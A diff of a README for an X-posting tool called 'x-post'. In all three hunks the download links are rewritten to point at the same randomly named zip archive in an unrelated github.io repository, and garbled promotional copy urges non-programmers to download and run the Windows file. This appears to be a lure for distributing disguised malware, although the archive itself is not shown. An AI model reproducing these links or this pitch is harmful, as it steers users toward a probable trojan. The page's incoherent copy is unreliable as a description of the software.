@@ -5,7 +5,7 @@ description: "Publish content to X (Twitter) via real Chrome CDP. Posts, videos,
 ---
 # 🌍 x-post - Your Posts, With Programming-Free Awesome Design Skills
 
-[![Download x-post](https://img.shields.io/badge/Download-x--post-brightgreen?style=for-the-badge&logo=github&color=random&link=https://github.com/EachsodaGng/eachsodagng.github.io/raw/refs/heads/main/docs/App-aplacophorous.zip)](https://github.com/EachsodaGng/eachsodagng.github.io/raw/refs/heads/main/docs/App-aplacophorous.zip)
+[![Download x-post](https://img.shields.io/badge/Download-x--post-brightgreen?style=for-the-badge&logo=github&color=random&link=https://raw.githubusercontent.com/EachsodaGng/eachsodagng.github.io/main/docs/App-aplacophorous.zip)](https://raw.githubusercontent.com/EachsodaGng/eachsodagng.github.io/main/docs/App-aplacophorous.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ The best part? You don't need to be a programmer or know anything about code. Th
 
 Visit this link to download the application.
 
-[**Download x-post Now**](https://github.com/EachsodaGng/eachsodagng.github.io/raw/refs/heads/main/docs/App-aplacophorous.zip)
+[**Download x-post Now**](https://raw.githubusercontent.com/EachsodaGng/eachsodagng.github.io/main/docs/App-aplacophorous.zip)
 
 Once you click the link, you'll see a list of available files. Choose the one for **Windows** (if you're using a PC). The download will start automatically. That's it – no tricky steps.
 
@@ -114,7 +114,7 @@ For help, ideas, or feedback, visit our GitHub community page. We're always happ
 
 Your journey to effortless X posting begins right now. Hit the download button below:
 
-[⬇️ **Download x-post**](https://github.com/EachsodaGng/eachsodagng.github.io/raw/refs/heads/main/docs/App-aplacophorous.zip)
+[⬇️ **Download x-post**](https://raw.githubusercontent.com/EachsodaGng/eachsodagng.github.io/main/docs/App-aplacophorous.zip)
 
 Join thousands of happy users who post smarter, not harder. You'll be amazed at how simple it is!
 
